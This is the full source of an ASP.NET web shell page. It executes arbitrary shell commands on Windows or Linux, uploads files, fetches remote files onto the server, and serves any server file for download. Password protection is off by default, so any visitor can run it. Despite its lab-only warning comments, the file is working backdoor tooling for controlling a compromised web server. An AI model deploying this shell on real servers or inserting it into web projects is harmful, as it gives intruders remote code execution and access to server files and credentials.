<%@ Page Language="C#" Debug="true" Trace="false" validateRequest="false" AutoEventWireup="true" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Net" %>

<script runat="server" language="C#">
////////////////////////////////////////////////////////////////////////////////
// Cross-Platform ASP.NET WebShell
// With Optional Password Protection, File Upload, Fetch Remote, and Download
////////////////////////////////////////////////////////////////////////////////
// - Detects Windows vs Linux via Path.DirectorySeparatorChar.
// - Windows -> cmd.exe, Linux -> /bin/bash
// - Allows optional password. If set, you must submit the correct password once.
//
// SECURITY WARNING:
//   This code can run arbitrary commands on your server and upload/download files.
//   NEVER expose it publicly. Use only in a secure test/lab environment.
////////////////////////////////////////////////////////////////////////////////

// ------------------ Optional Password Setting ------------------
// Set this constant to a non-empty string (e.g., "MyS3cr3t") to enable password protection.
// Leave it blank ("") if you do NOT want any password at all.
private const string SHELL_PASS = "";
// ---------------------------------------------------------------

// A string buffer to collect command outputs so they appear under the form:
private string outputLog = "";

// On Page Load, check password (if set)
protected void Page_Load(object sender, EventArgs e)
{
    if (!string.IsNullOrEmpty(SHELL_PASS))
    {
        if (Session["CrossShellAuth"] == null || (bool)Session["CrossShellAuth"] == false)
        {
            string submitted = Request.Form["passwordAttempt"] ?? "";
            if (submitted == SHELL_PASS)
            {
                Session["CrossShellAuth"] = true;
            }
            else
            {
                ShowPasswordForm();
                Response.End();
            }
        }
    }
}

// Display password form if not authenticated
private void ShowPasswordForm()
{
    // This minimal HTML is intentionally output directly.
    // Execution ends after writing so the rest of the page won't render.
    Response.Write(@"
<html>
<head><title>Password Required</title></head>
<body style='font-family: monospace; margin: 2em;'>
    <h2>Enter Password</h2>
    <form method='post'>
        <label>Password:
            <input type='password' name='passwordAttempt' />
        </label>
        <input type='submit' value='Submit' />
    </form>
</body>
</html>
");
}

// Execute a command (Windows vs. Linux) & return HTML-encoded output
private string ExecuteCommand(string command, string workingDir)
{
    if (string.IsNullOrEmpty(workingDir) || !Directory.Exists(workingDir))
    {
        workingDir = Server.MapPath(".");
    }

    bool isWindows = (Path.DirectorySeparatorChar == '\\');
    ProcessStartInfo psi = new ProcessStartInfo
    {
        WorkingDirectory       = workingDir,
        RedirectStandardOutput = true,
        RedirectStandardError  = true,
        UseShellExecute        = false,
        CreateNoWindow         = true
    };

    if (isWindows)
    {
        psi.FileName  = "cmd.exe";
        psi.Arguments = "/c " + command;
    }
    else
    {
        // Linux
        psi.FileName  = "/bin/bash";
        psi.Arguments = "-c \"exec 2>&1; " + command.Replace("\"", "\\\"") + "\"";
    }

    string output;
    using (Process proc = Process.Start(psi))
    {
        output = proc.StandardOutput.ReadToEnd() + proc.StandardError.ReadToEnd();
        proc.WaitForExit();
    }
    return Server.HtmlEncode(output);
}

// Execute button: run command, store output under the form
protected void btnExec_Click(object sender, EventArgs e)
{
    string result = ExecuteCommand(txtArg.Text, txtCWD.Text);
    outputLog += "<pre>" + result + "</pre>";
}

// Upload button
protected void btnUpload_Click(object sender, EventArgs e)
{
    if (fileUpload.HasFile)
    {
        string dir = txtCWD.Text;
        if (string.IsNullOrEmpty(dir) || !Directory.Exists(dir))
        {
            dir = Server.MapPath(".");
        }
        string filename = Path.GetFileName(fileUpload.FileName);
        string savePath = Path.Combine(dir, filename);

        try
        {
            fileUpload.SaveAs(savePath);
            outputLog += "<pre>Uploaded: " + Server.HtmlEncode(savePath)
                        + " (" + fileUpload.FileBytes.Length + " bytes)</pre>";
        }
        catch (Exception ex)
        {
            outputLog += "<pre>Error uploading file:\n"
                + Server.HtmlEncode(ex.Message) + "</pre>";
        }
    }
    else
    {
        outputLog += "<pre>No file selected.</pre>";
    }
}

// Fetch remote file
protected void btnFetch_Click(object sender, EventArgs e)
{
    string dir = txtCWD.Text;
    if (string.IsNullOrEmpty(dir) || !Directory.Exists(dir))
    {
        dir = Server.MapPath(".");
    }
    string remoteUrl = txtFetchURL.Text.Trim();
    if (string.IsNullOrEmpty(remoteUrl))
    {
        outputLog += "<pre>No remote URL provided.</pre>";
        return;
    }
    string localFile = Path.Combine(dir, Path.GetFileName(remoteUrl));

    try
    {
        using (WebClient wc = new WebClient())
        {
            wc.DownloadFile(remoteUrl, localFile);
        }
        FileInfo fi = new FileInfo(localFile);
        outputLog += "<pre>Fetched file: "
            + Server.HtmlEncode(localFile)
            + " (" + fi.Length + " bytes)</pre>";
    }
    catch (Exception ex)
    {
        outputLog += "<pre>Error fetching file:\n"
            + Server.HtmlEncode(ex.Message) + "</pre>";
    }
}

// Download local file from server
protected void btnDownloadLocal_Click(object sender, EventArgs e)
{
    string dir = txtCWD.Text;
    if (string.IsNullOrEmpty(dir) || !Directory.Exists(dir))
    {
        dir = Server.MapPath(".");
    }
    string requestedFile = txtDownloadLocalPath.Text.Trim();
    if (string.IsNullOrEmpty(requestedFile))
    {
        outputLog += "<pre>No local file path provided.</pre>";
        return;
    }

    bool isAbsolutePath = false;
    try
    {
        isAbsolutePath = Path.IsPathRooted(requestedFile);
    }
    catch {}

    string fullPath = requestedFile;
    if (!isAbsolutePath)
    {
        fullPath = Path.Combine(dir, requestedFile);
    }

    if (!File.Exists(fullPath))
    {
        outputLog += "<pre>File not found: "
            + Server.HtmlEncode(fullPath) + "</pre>";
        return;
    }

    try
    {
        FileInfo fi = new FileInfo(fullPath);
        Response.Clear();
        Response.ContentType = "application/octet-stream";
        Response.AddHeader("Content-Disposition", "attachment; filename=\"" + fi.Name + "\"");
        Response.WriteFile(fullPath);
        Response.End();
    }
    catch (Exception ex)
    {
        outputLog += "<pre>Error downloading file:\n"
            + Server.HtmlEncode(ex.Message) + "</pre>";
    }
}

// Before rendering the page, inject outputLog into litOutput
protected void Page_PreRender(object sender, EventArgs e)
{
    litOutput.Text = outputLog;
}
</script>

<!DOCTYPE html>
<html>
<head>
    <title>Cross-Platform ASP.NET WebShell</title>
    <!--
        SECURITY WARNING:
          This page executes arbitrary commands on your server.
          NEVER expose publicly.
          Use only in a secure test/lab environment.
    -->
</head>
<body style="font-family: monospace; margin: 2em;">

    <form runat="server" method="post" enctype="multipart/form-data">
        <h2>Cross-Platform ASP.NET WebShell</h2>

        <% if (!string.IsNullOrEmpty(SHELL_PASS)) { %>
            <p><em>Password protection is <strong>enabled</strong>.</em></p>
        <% } else { %>
            <p><em>Password protection is <strong>disabled</strong>.</em></p>
        <% } %>

        <!-- Working Directory -->
        <label><strong>CWD:</strong></label><br/>
        <asp:TextBox ID="txtCWD" runat="server" Width="400px"
            Text='<%# Server.MapPath(".") %>'></asp:TextBox>
        <br /><br />

        <!-- Command Execution -->
        <label><strong>Command:</strong></label><br/>
        <asp:TextBox ID="txtArg" runat="server" Width="400px"></asp:TextBox>
        <asp:Button ID="btnExec" runat="server" Text="Execute" OnClick="btnExec_Click" />
        <br /><br />

        <!-- File Upload -->
        <label><strong>Upload a file (from your local machine to server):</strong></label><br/>
        <asp:FileUpload ID="fileUpload" runat="server" />
        <asp:Button ID="btnUpload" runat="server" Text="Upload" OnClick="btnUpload_Click" />
        <br /><br />

        <!-- Fetch Remote -->
        <label><strong>Fetch Remote URL (HTTP/HTTPS) -> server:</strong></label><br/>
        <asp:TextBox ID="txtFetchURL" runat="server" Width="400px"
            Placeholder="http://example.com/file.exe"></asp:TextBox>
        <asp:Button ID="btnFetch" runat="server" Text="Fetch" OnClick="btnFetch_Click" />
        <br /><br />

        <!-- Download Local -->
        <label><strong>Download local file from server to your browser:</strong></label><br/>
        <asp:TextBox ID="txtDownloadLocalPath" runat="server" Width="400px"
            Placeholder="/home/user/file.txt or C:\temp\file.txt"></asp:TextBox>
        <asp:Button ID="btnDownloadLocal" runat="server"
            Text="Download" OnClick="btnDownloadLocal_Click" />
        <br /><br />
    </form>

    <!-- All command outputs appear here, after the form -->
    <asp:Literal ID="litOutput" runat="server" Mode="PassThrough" />

</body>
</html>
